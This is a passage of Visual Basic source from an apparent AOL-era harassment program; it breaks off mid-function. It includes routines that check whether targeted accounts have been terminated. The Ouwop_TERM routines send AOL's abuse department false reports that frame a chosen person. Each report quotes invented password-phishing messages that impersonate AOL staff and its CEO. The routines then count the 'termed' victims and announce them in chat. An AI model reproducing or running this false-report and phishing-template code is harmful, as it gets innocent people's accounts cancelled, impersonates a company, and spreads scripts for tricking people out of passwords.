edit& = FindWindowEx(mail&, 0&, "_AOL_Edit", vbNullString)
send& = FindWindowEx(mail&, 0&, "_AOL_icon", vbNullString)
Loop Until mail& <> 0 And send& <> 0 And edit& <> 0
Call SendMessageByString(edit&, WM_SETTEXT, 0&, sn$ & ",*")
edit& = FindWindowEx(mail&, edit&, "_AOL_Edit", vbNullString)
edit& = FindWindowEx(mail&, edit&, "_AOL_Edit", vbNullString)
Call SendMessageByString(edit&, WM_SETTEXT, 0&, "boo")
Rich& = FindWindowEx(mail&, Rich&, "RICHCNTL", vbNullString)
Call SendMessageByString(Rich&, WM_SETTEXT, 0&, "-=P")
For Count& = 1 To 13
send& = FindWindowEx(mail&, send&, "_AOL_icon", vbNullString)
Next Count&
Call SendMessage(send&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(send&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
unknown& = FindWindowEx(AolMdi, 0&, "AOL Child", "Error")
errorview& = FindWindowEx(unknown, 0&, "_AOL_View", vbNullString)
Loop Until unknown& <> 0 And errorview& <> 0
ErrorText$ = gettext(errorview&)
Call PostMessage(unknown&, WM_CLOSE, 0&, 0&)
DoEvents
Call PostMessage(mail&, WM_CLOSE, 0&, 0&)
DoEvents
Do
DoEvents
savewin& = FindWindow("#32770", "America Online")
savebut& = FindWindowEx(savewin&, 0&, "Button", "&No")
Loop Until savewin& <> 0 And savebut& <> 0
Call SendMessage(savebut&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(savebut&, WM_KEYUP, VK_SPACE, 0&)
ErrorText$ = LCase(RemoveSpace(ErrorText$))
If InStr(ErrorText$, LCase(RemoveSpace(sn$))) <> 0 Then
CheckIfDead = True
MsgBox sn$ + ", iz DEAD", vbCritical, "DEAD!"
Else
CheckIfDead = False
MsgBox sn$ + ", iz ACTIVE", 64, "ACTIVE!"
End If
If CheckIfDead = True Then If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + sn$ + ", sn confirmed 'DEAD!'"
If CheckIfDead = False Then If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + sn$ + ", sn confirmed 'ACTIVE!'"

End Function

Public Function CheckAlive_TOSER(screenname As String, List1 As ListBox, list2 As ListBox, txt As TextBox) As Boolean
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim MailWindow As Long, NoWindow As Long, NoButton As Long
    Call senDmail("*, " & screenname$, "·´¯`·.·°[Chekin Statuz on ACCOUNT -MazTa TOSer", "Ouwopz MazTa TOSer!")
    TimeOut (0.5)
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Do
        DoEvents
        ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
        ErrorString$ = gettext(ErrorTextWindow&)
    Loop Until ErrorWindow& <> 0 And ErrorTextWindow& <> 0 And ErrorString$ <> ""
    If InStr(LCase(RePlacestRing(ErrorString$, " ", "")), LCase(RePlacestRing(screenname$, " ", ""))) > 0 Then
        CheckAlive_TOSER = False

MsgBox "Account [ " + screenname + " ]  Bitch azz iz DEAD!!!!", vbCritical, "DEAD"
list2.AddItem screenname
txt.Text = List1.list(List1.ListIndex)
List1.RemoveItem List1.ListIndex

Else
MsgBox "Account [ " + screenname + " ] is Still Active, Give it some more time!", 64, "ACTIVE"
'txt.Text = list1.list(list1.ListIndex)
'list1.RemoveItem list1.ListIndex

CheckAlive_TOSER = True
    End If
    MailWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
    Call PostMessage(ErrorWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(MailWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Do
        DoEvents
        NoWindow& = FindWindow("#32770", "America Online")
        NoButton& = FindWindowEx(NoWindow&, 0&, "Button", "&No")
    Loop Until NoWindow& <> 0& And NoButton& <> 0
    Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Sub PHISH_CheckAlive(name As TextBox, List1 As ListBox)
top:
TimeOut (0.1)
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim MailWindow As Long, NoWindow As Long, NoButton As Long
    Call senDmail("*, " & name, "·´¯`·.·°[Chekin ACCOUNT -MazTa ProGGz IXI <>< BowL", "Ouwopz MazTa TOSer!")
    If FindAwin("Write Mail") = 0 Then GoTo top
    TimeOut (0.3)
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Do
        DoEvents
        ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
        ErrorString$ = gettext(ErrorTextWindow&)
    Loop Until ErrorWindow& <> 0 And ErrorTextWindow& <> 0 And ErrorString$ <> ""

If InStr(LCase(RePlacestRing(ErrorString$, " ", "")), LCase(RePlacestRing(sn$, " ", ""))) > 0 Then
TimeOut (0.1)
List1.RemoveItem List1.ListIndex
name.Text = List1.list(List1.ListIndex)
Else


End If

MailWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
Call PostMessage(ErrorWindow&, WM_CLOSE, 0&, 0&)
DoEvents
Call PostMessage(MailWindow&, WM_CLOSE, 0&, 0&)
DoEvents
Do
DoEvents
        NoWindow& = FindWindow("#32770", "America Online")
        NoButton& = FindWindowEx(NoWindow&, 0&, "Button", "&No")
    Loop Until NoWindow& <> 0& And NoButton& <> 0
    Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Sub












Function getdiskinfo(sRootPathName As String, sWhatInfo As String) As String
    Dim X As Long
    Dim lSectorsPerCluster As Long, lBytesPerSector As Long
    Dim lNumberOfFreeClusters As Long, lTotalNumberOfClusters As Long
    X = GetDiskFreeSpace(sRootPathName, lSectorsPerCluster, lBytesPerSector, lNumberOfFreeClusters, lTotalNumberOfClusters)
    getdiskinfo = X
    If X Then
        CurrentDisk.RootPath = sRootPathName
        CurrentDisk.freebytes = lBytesPerSector * lSectorsPerCluster * lNumberOfFreeClusters
        CurrentDisk.totalbytes = lBytesPerSector * lSectorsPerCluster * lTotalNumberOfClusters
        CurrentDisk.FreePcnt = (CurrentDisk.totalbytes - CurrentDisk.freebytes) / CurrentDisk.totalbytes
        CurrentDisk.UsedPcnt = CurrentDisk.freebytes / CurrentDisk.totalbytes
    Else
        CurrentDisk.RootPath = ""
        CurrentDisk.freebytes = 0
        CurrentDisk.totalbytes = 0
        CurrentDisk.FreePcnt = 0
        CurrentDisk.UsedPcnt = 0
    End If
    Select Case UCase(sWhatInfo)
        Case "ROOTPATH"
            getdiskinfo = CurrentDisk.RootPath
        Case "FREEBYTES"
            getdiskinfo = Format$(CurrentDisk.freebytes, "###,###,###,##0")
        Case "TOTALBYTES"
            getdiskinfo = Format$(CurrentDisk.totalbytes, "###,###,###,##0")
        Case "FREEPCNT"
            getdiskinfo = Format$(CurrentDisk.FreePcnt, "Percent")
        Case "USEDPCNT"
            getdiskinfo = Format$(CurrentDisk.UsedPcnt, "Percent")
    End Select
End Function
Function GetTotalBytes()
GetTotalBytes = CurrentDisk.totalbytes
End Function

Function GetUsedPercent()
GetUsedPercent = CurrentDisk.UsedPcnt & "%"
End Function


Public Function GetSystemDir() As String
    Dim sDir As String * 255
    Dim iRturn As Integer
    Dim Sze As Long
    sDir = Space$(255)
    Sze = Len(sDir)
  iRturn = GetSystemDirectory(sDir, Sze)
GetSystemDir = Left$(sDir, InStr(1, sDir, Chr$(0)) - 1)
End Function
Function GetFreePercent()
GetFreePercent = CurrentDisk.FreePcnt & "%"
End Function



Function GetFreeBytes()
GetFreeBytes = CurrentDisk.freebytes
End Function



Sub Attach2(file)
'Attach part
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Write Mail")
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
cLickiCoN (e)
TimeOut (0.5)

aomodal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(aomodal%, "_AOL_Icon")
cLickiCoN (AOIcon%)
TimeOut (0.5)

AOL% = FindWindow("#32770", "Attach")
imsendto% = FindChildByClass(AOL%, "Edit")
Call SendMessageByString(imsendto%, WM_SETTEXT, 0, file)
TimeOut (0.5)

OKw = FindWindow("#32770", "Attach")
If proG_STAT$ = "OFF" Then Exit Sub
okb = FindChildByTitle(OKw, "&Open")
okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
TimeOut (0.4)
'AppActivate "america  Online"
'SendKeys ("{TAB}")
'TimeOut (0.2)
'SendKeys ("{TAB}")
'TimeOut (0.2)
'SendKeys (" ")
'TimeOut (0.5)
waiT (0.2)
Do: DoEvents
mod2% = FindWindow("_AOL_Modal", vbNullString)
Tree2% = FindChildByClass(mod2%, "_AOL_Tree")
stat% = FindChildByClass(mod2%, "_AOL_Static")
iconb% = FindChildByClass(mod2%, "_AOL_Icon")
If mod2% <> 0 And Tree2% <> 0 And stat% <> 0 And iconb% <> 0 Then Exit Do
Loop
waiT (0.2)
iconb% = GetWindow(iconb%, GW_HWNDNEXT) 'detach
    iconb% = GetWindow(iconb%, GW_HWNDNEXT) 'OK

clickit = SendMessage(iconb%, WM_LBUTTONDOWN, 0, 0&)
clickit = SendMessage(iconb%, WM_LBUTTONUP, 0, 0&)

sendit = SendMessage(Edi%, WM_LBUTTONDOWN, 0, 0&)
sendit = SendMessage(Edi%, WM_LBUTTONUP, 0, 0&)
End Sub

Function File_IfDirectoryExists(TheDirectory)
Dim Check As Integer
On Error Resume Next
If Right(TheDirectory, 1) <> "/" Then TheDirectory = TheDirectory + "/"
Check = Len(dir$(TheDirectory))
If Err Or Check = 0 Then
    File_IfDirectoryExists = False
Else
    File_IfDirectoryExists = True
End If
End Function
Sub Directory_Create(dir)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
On Error Resume Next
MkDir dir
End Sub
Function FileWrite(FileName, Wat)
TimeOut (0.2)
On Error Resume Next
Open FileName For Output As #1
Print #1, Wat
Close #1
End Function
Function FileCreate(FileName As String)
free = FreeFile
Open FileName For Random As free
Close free
End Function
Sub Static_chat_change(What$)
'ouwop
'changez da label unda da liztbox
'in da 4.0 chat room
If XAOL4_GetCurrentRoomName = "" Then

Else
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
stat% = FindChildByClass(chil%, "_AOL_Static")
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)
stat% = GetWindow(stat%, GW_HWNDNEXT)

X = SendMessageByString(stat%, WM_SETTEXT, 0, What$)
End If

End Sub

Sub Ouwop_TERM(Who$, t As String, tmr As Timer, sec As Label)
'ouwop
'termz on aol2/4/5, alwayz different phraze'z
'nigga wut!
If Who$ = "" Then 'chekz to see if therez a perzon named to b tosed
MsgBox "Pleaze Select someone 2 Term", vbCritical, "ERROR!" 'reportz there aint
Else 'but if there iz
tmr.Enabled = True
Perzon$ = Who$ 'da perzon = who$
t$ = INI_GeT("mazta", "term", App.Path + "\uzer.ini") 'getz the # of peepz you termed
t$ = t + 1 'addz 1 more cuz your doin it now
Call INI_WriTe("mazta", "term", t$, App.Path + "\uzer.ini") 'writex to da ini file
Dim Color1
Randomize
Color1 = Int(58 * Rnd + 1)
'feel free to add more, example=-
'add another if color1 = (# greater by 1 then last) then dh$ = "your phraze"
'and increaze da integer by 1 number, ike 58 would go to 59... ext-=
If Color1 = 1 Then dh$ = "Hard Drive"
If Color1 = 2 Then dh$ = "Parental Controlz"
If Color1 = 3 Then dh$ = "Cussing"
If Color1 = 4 Then dh$ = "Lagg"
If Color1 = 5 Then dh$ = "Punt"
If Color1 = 6 Then dh$ = "Email"
If Color1 = 7 Then dh$ = "IM"
If Color1 = 8 Then dh$ = "W W W"
If Color1 = 9 Then dh$ = "Free AOL"
If Color1 = 10 Then dh$ = "Virus"
If Color1 = 11 Then dh$ = "CC# Attempt"
If Color1 = 12 Then dh$ = "Fronting"
If Color1 = 13 Then dh$ = "Served"
If Color1 = 14 Then dh$ = "MM"
If Color1 = 15 Then dh$ = "Phish"
If Color1 = 16 Then dh$ = "Lamer"
If Color1 = 17 Then dh$ = "Insultz"
If Color1 = 18 Then dh$ = "Help Me"
If Color1 = 19 Then dh$ = "Pimp"
If Color1 = 20 Then dh$ = "Hacker"
If Color1 = 21 Then dh$ = "ReGuLaTa"
If Color1 = 22 Then dh$ = "MazTa"
If Color1 = 23 Then dh$ = "Talkin shit"
If Color1 = 24 Then dh$ = "Bye bye AOL"
If Color1 = 25 Then dh$ = "Ouch"
If Color1 = 26 Then dh$ = "Nice"
If Color1 = 27 Then dh$ = "REAL mean"
If Color1 = 28 Then dh$ = "Bezt"
If Color1 = 29 Then dh$ = "Normal"
If Color1 = 30 Then dh$ = "???"
If Color1 = 31 Then dh$ = "Confuzed"
If Color1 = 32 Then dh$ = "ISP"
If Color1 = 33 Then dh$ = "<><"
If Color1 = 34 Then dh$ = "9 MM"
If Color1 = 35 Then dh$ = "Sawed off"
If Color1 = 36 Then dh$ = "Jack Move"
If Color1 = 37 Then dh$ = "Juzti(\/"
If Color1 = 38 Then dh$ = "E.C."
If Color1 = 39 Then dh$ = "Muggzy"
If Color1 = 40 Then dh$ = "Jaybird"
If Color1 = 41 Then dh$ = "Hipnot"
If Color1 = 42 Then dh$ = "Ouwop"
If Color1 = 43 Then dh$ = "Baltimore"
If Color1 = 44 Then dh$ = "HyperLink"
If Color1 = 45 Then dh$ = "Cat Fake"
If Color1 = 46 Then dh$ = "Tos Fake"
If Color1 = 47 Then dh$ = "Guide Fake"
If Color1 = 48 Then dh$ = "SteveCase"
If Color1 = 49 Then dh$ = "Mother Board"
If Color1 = 50 Then dh$ = "CPU"
If Color1 = 51 Then dh$ = "Taytuh"
If Color1 = 52 Then dh$ = "IXI"
If Color1 = 53 Then dh$ = "KieV"
If Color1 = 54 Then dh$ = "KrePz"
If Color1 = 55 Then dh$ = "Freestyle"
If Color1 = 56 Then dh$ = "Hotmail"
If Color1 = 57 Then dh$ = "Nonz"
If Color1 = 58 Then dh$ = "ACE"
nu$ = Color1
'''''''''''''phrazez
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((7 * Rnd) + 1) 'randomizez 7 greeT phrazez
If asd = 1 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me in my Email" + Chr(10) + "Hi " + getuser + ", "
If asd = 2 Then dsa$ = "I was told to tell you that " + Perzon$ + "said this to me in a Instant Message" + Chr(10) + "Hello " + getuser + ", "
If asd = 3 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me" + Chr(10) + "Good Day " + getuser + ", "
If asd = 4 Then dsa$ = "I am reporting " + Perzon$ + ", because he said" + Chr(10) + "Good Afternoon " + getuser + ", "
If asd = 5 Then dsa$ = "I am reporting " + Perzon$ + ", because he said" + Chr(10) + "Good Evening " + getuser + ", "
If asd = 6 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me in my Email" + Chr(10) + "Good Morning " + getuser + ", "
If asd = 7 Then dsa$ = "I hope this is da right person, anyway, i need help"
Randomize
asd = Int((13 * Rnd) + 1) 'randomizez 13 start phrazez
If asd = 1 Then das$ = dsa$ & "I am with the AOL User Resource Department. "
If asd = 2 Then das$ = dsa$ & "I am Steve Case the C.E.O. of America Online. "
If asd = 3 Then das$ = dsa$ & "I am a Guide for America Online. "
If asd = 4 Then das$ = dsa$ & "I am with the AOL Online Security Force. "
If asd = 5 Then das$ = dsa$ & "I am with AOL's billing department. "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department. "
If asd = 7 Then das$ = dsa$ & "I am a Hacker now gimmie your Fucking Password."
If asd = 8 Then das$ = dsa$ & "Hello, i Am with AOL's Mainframe Department."
If asd = 9 Then das$ = dsa$ & "We are Having Problems With your Billing Information."
If asd = 10 Then das$ = dsa$ & "I am The Head of X14 Level in AOL Dept."
If asd = 11 Then das$ = dsa$ & "Im the TOSAdvisor on Another Screen Name."
If asd = 12 Then das$ = dsa$ & "I am GOd to you, Now Gimmie your Password!"
If asd = 13 Then das$ = dsa$ & "Hello, Good Aftrnoon, i AM with AOL."

Randomize
asd = Int((6 * Rnd) + 1) 'randomizez what thwy supposivly said
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate canalization of this account."
If asd = 3 Then das$ = das$ & "During your sign on period your password number did not cycle, please respond with the password used when settin up this screen name. Failure to do so will result in immediate cancellation of your account."
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online. "
If asd = 5 Then das$ = das$ & "I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cansellation of this account."
If asd = 6 Then das$ = das$ & "We here at AOL have made a SERIOUS billing error. We have your sign on passoword as 4ry67e, If this is not correct, please respond with the correct password. "
 Randomize
asd = Int((6 * Rnd) + 1) 'randomizez there signature
If asd = 1 Then das$ = das$ & "Sorry for this inconvenience. Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online. :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and we hope that you enjoy America Online. :-). "
If t$ = "" Then t$ = "1" 'incase the tos victim iz numba 1 it makez #1 [useless]
Perzon$ = Who$
az = "[¸·´]"
If AOL_VerzioN = 5 Then fgt$ = "[<u>aol50</u>]": GoTo ppp
If AOL_VerzioN = 4 Then fgt$ = "[<u>aol40</u>]" Else fgt$ = "[<u>aol25</u>]": GoTo ppp
ppp:
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + "<B>M</b>azTa <b>Toz</b>inG <i>" + Perzon$ + "</i> -" + fgt$ + "-")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + ("<b>P</b>hraze #[<i>" + nu$ + "</i>] ~ [<i>" + dh$ + "</i>]"))
If AOL_VerzioN = 5 Then Call senDmail("TosGeneral", "I am Reporting " + Who$, das$): GoTo top
If AOL_VerzioN = 4 Then Call senDmail("TosGeneral", "I am Reporting " + Who$, das$) Else Call AOL25_Compoze("TosGeneral", "I am Reporting " + Perzon$, das$): GoTo top
top:
TimeOut (0.1)
If FindAwin("Write Mail") Then GoTo top 'waitz until da mail iz sent aol25
If FindAwin("Compose Mail") Then GoTo top 'same az above but for aol4
tmr.Enabled = False
TimeOut (0.1)
sec.caption = convertseconds(sec.caption)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + ("<b>T</b>ozed <i>" + Perzon$ + "</i> in [<i>" + sec.caption + "</i>] <b>s</b>econdz"))
Call ClicK_OK("America Online") 'clickz ok on da aol msg
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then uZa$ = INI_GeT("Uzer", "current", (App.Path + "\uzer.ini"))
Call ClicK_OK("America Online")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
Call ClicK_OK("America Online")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + "<u>" + uZa$ + ("</u> <b>T</b>ermed [<i>" + t$ + "</i>] <b>p</b>Eepz wi<b>T</b> (<i>\/)</i>az<b>T</b>a <b>P</b>roGG!"))
Call ClicK_OK("America Online")
sec.caption = "0"
End If
End Sub
Sub Ouwop_TERM2(Who$, t As String, Color1 As String, tmr As Timer, sec As Label)
'ouwop
'termz on aol2/4/5, alwayz different phraze'z
'nigga wut!
If Who$ = "" Then 'chekz to see if therez a perzon named to b tosed
MsgBox "Pleaze Select someone 2 Term", vbCritical, "ERROR!" 'reportz there aint
Else 'but if there iz
t$ = INI_GeT("mazta", "term", App.Path + "\uzer.ini") 'getz the # of peepz you termed
t$ = t + 1 'addz 1 more cuz your doin it now
Call INI_WriTe("mazta", "term", t$, App.Path + "\uzer.ini") 'writex to da ini file
'feel free to add more, example=-
'add another if color1 = (# greater by 1 then last) then dh$ = "your phraze"
'and increaze da integer by 1 number, ike 58 would go to 59... ext-=
tmr.Enabled = True
sec.caption = "0"
If Color1 = 1 Then dh$ = "Hard Drive"
If Color1 = 2 Then dh$ = "Parental Controlz"
If Color1 = 3 Then dh$ = "Jaybird"
If Color1 = 4 Then dh$ = "Lagg"
If Color1 = 5 Then dh$ = "Punt"
If Color1 = 6 Then dh$ = "Email"
If Color1 = 7 Then dh$ = "IM"
If Color1 = 8 Then dh$ = "W W W"
If Color1 = 9 Then dh$ = "Free AOL"
If Color1 = 10 Then dh$ = "Virus"
If Color1 = 11 Then dh$ = "CC# Attempt"
If Color1 = 12 Then dh$ = "Fronting"
If Color1 = 13 Then dh$ = "Served"
If Color1 = 14 Then dh$ = "MM"
If Color1 = 15 Then dh$ = "Hipnot"
If Color1 = 16 Then dh$ = "Lamer"
If Color1 = 17 Then dh$ = "Insultz"
If Color1 = 18 Then dh$ = "Help Me"
If Color1 = 19 Then dh$ = "Pimp"
If Color1 = 20 Then dh$ = "Hacker"
If Color1 = 21 Then dh$ = "ReGuLaTa"
If Color1 = 22 Then dh$ = "MazTa"
If Color1 = 23 Then dh$ = "Talkin shit"
If Color1 = 24 Then dh$ = "KieV"
If Color1 = 25 Then dh$ = "Ouch"
If Color1 = 26 Then dh$ = "Nice"
If Color1 = 27 Then dh$ = "REAL mean"
If Color1 = 28 Then dh$ = "Bezt"
If Color1 = 29 Then dh$ = "Normal"
If Color1 = 30 Then dh$ = "???"
If Color1 = 31 Then dh$ = "Confuzed"
If Color1 = 32 Then dh$ = "ISP"
If Color1 = 33 Then dh$ = "Ouwop"
If Color1 = 34 Then dh$ = "9 MM"
If Color1 = 35 Then dh$ = "Sawed off"
If Color1 = 36 Then dh$ = "Jack Move"
If Color1 = 37 Then dh$ = "Juzti(\/"
If Color1 = 38 Then dh$ = "E.C."
If Color1 = 39 Then dh$ = "Muggzy"
If Color1 = 40 Then dh$ = "Cussin"
If Color1 = 41 Then dh$ = "Phish"
If Color1 = 42 Then dh$ = "<><"
If Color1 = 43 Then dh$ = "Baltimore"
If Color1 = 44 Then dh$ = "HyperLink"
If Color1 = 45 Then dh$ = "Cat Fake"
If Color1 = 46 Then dh$ = "Tos Fake"
If Color1 = 47 Then dh$ = "Guide Fake"
If Color1 = 48 Then dh$ = "SteveCase"
If Color1 = 49 Then dh$ = "Mother Board"
If Color1 = 50 Then dh$ = "CPU"
If Color1 = 51 Then dh$ = "Taytuh"
If Color1 = 52 Then dh$ = "IXI"
If Color1 = 53 Then dh$ = "Bye Bye AOL"
If Color1 = 54 Then dh$ = "KrePz"
If Color1 = 55 Then dh$ = "Freestyle"
If Color1 = 56 Then dh$ = "Hotmail"
If Color1 = 57 Then dh$ = "Nonz"
If Color1 = 58 Then dh$ = "ACE"
nu$ = Color1
'''''''''''''phrazez
Perzon$ = Who$
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((7 * Rnd) + 1) 'randomizez 7 greeT phrazez
If asd = 1 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me in my Email" + Chr(10) + "Hi " + getuser + ", "
If asd = 2 Then dsa$ = "I was told to tell you that " + Perzon$ + "said this to me in a Instant Message" + Chr(10) + "Hello " + getuser + ", "
If asd = 3 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me" + Chr(10) + "Good Day " + getuser + ", "
If asd = 4 Then dsa$ = "I am reporting " + Perzon$ + ", because he said" + Chr(10) + "Good Afternoon " + getuser + ", "
If asd = 5 Then dsa$ = "I am reporting " + Perzon$ + ", because he said" + Chr(10) + "Good Evening " + getuser + ", "
If asd = 6 Then dsa$ = "I am reporting " + Perzon$ + ", because he said this to me in my Email" + Chr(10) + "Good Morning " + getuser + ", "
If asd = 7 Then dsa$ = "I hope this is da right person, anyway, i need help"
Randomize
asd = Int((13 * Rnd) + 1) 'randomizez 13 start phrazez
If asd = 1 Then das$ = dsa$ & "I am with the AOL User Resource Department. "
If asd = 2 Then das$ = dsa$ & "I am Steve Case the C.E.O. of America Online. "
If asd = 3 Then das$ = dsa$ & "I am a Guide for America Online. "
If asd = 4 Then das$ = dsa$ & "I am with the AOL Online Security Force. "
If asd = 5 Then das$ = dsa$ & "I am with AOL's billing department. "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department. "
If asd = 7 Then das$ = dsa$ & "I am a Hacker now gimmie your Fucking Password."
If asd = 8 Then das$ = dsa$ & "Hello, i Am with AOL's Mainframe Department."
If asd = 9 Then das$ = dsa$ & "We are Having Problems With your Billing Information."
If asd = 10 Then das$ = dsa$ & "I am The Head of X14 Level in AOL Dept."
If asd = 11 Then das$ = dsa$ & "Im the TOSAdvisor on Another Screen Name."
If asd = 12 Then das$ = dsa$ & "I am GOd to you, Now Gimmie your Password!"
If asd = 13 Then das$ = dsa$ & "Hello, Good Aftrnoon, i AM with AOL."

Randomize
asd = Int((6 * Rnd) + 1) 'randomizez what thwy supposivly said
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate canalization of this account."
If asd = 3 Then das$ = das$ & "During your sign on period your password number did not cycle, please respond with the password used when settin up this screen name. Failure to do so will result in immediate cancellation of your account."
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online. "
If asd = 5 Then das$ = das$ & "I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cansellation of this account."
If asd = 6 Then das$ = das$ & "We here at AOL have made a SERIOUS billing error. We have your sign on passoword as 4ry67e, If this is not correct, please respond with the correct password. "
 Randomize
asd = Int((6 * Rnd) + 1) 'randomizez there signature
If asd = 1 Then das$ = das$ & "Sorry for this inconvenience. Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online. :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and we hope that you enjoy America Online. :-). "
If t$ = "" Then t$ = "1" 'incase the tos victim iz numba 1 it makez #1 [useless]
Perzon$ = Who$
az = "[¸·´]"
If AOL_VerzioN = 5 Then fgt$ = "[<u>aol50</u>]": GoTo ppp
If AOL_VerzioN = 4 Then fgt$ = "[<u>aol40</u>]" Else fgt$ = "[<u>aol25</u>]": GoTo ppp
ppp:
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + "<B>M</b>azTa <b>Toz</b>inG <i>" + Perzon$ + "</i> -" + fgt$ + "-")
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (0.5)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat (az + ("<b>P</b>hraze #[<i>" + nu$ + "</i>] ~ [<i>" + dh$ + "</i>]"))
If AOL_VerzioN = 5 Then Call senDmail("TosGeneral", "I am Reporting " + Who$, das$): GoTo top
If AOL_VerzioN = 4 Then Call senDmail("TosGeneral", "I am Reporting " + Who$, das$) Else Call AOL25_Compoze("TosGeneral", "I am Reporting " + Perzon$, das$): GoTo top
top:
TimeOut (0.1)
If FindAwin("Write Mail") Then GoTo top 'waitz until da mail iz sent aol25
If FindAwin("Compose Mail") Then GoTo top 'same az above but for aol4
tmr.Enabled = False
TimeOut (0.1)
sec.caption = convertseconds(sec.caption)
